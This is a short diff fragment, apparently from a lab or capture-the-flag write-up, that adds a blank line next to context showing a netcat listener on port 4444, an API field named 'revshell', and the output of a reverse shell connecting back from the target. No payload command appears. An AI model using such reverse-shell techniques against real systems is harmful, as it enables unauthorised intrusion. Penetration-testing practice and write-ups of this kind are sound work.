@@ -787,6 +787,7 @@ listening on [any] 4444 ...
 - `"serverId":"revshell"` — An arbitrary identifier required by the API schema.
 
 **Result:**
+
 ```shell
 connect to [10.10.14.85] from (UNKNOWN) [10.129.245.216] 54870
 bash: cannot set terminal process group (1056): Inappropriate ioctl for device
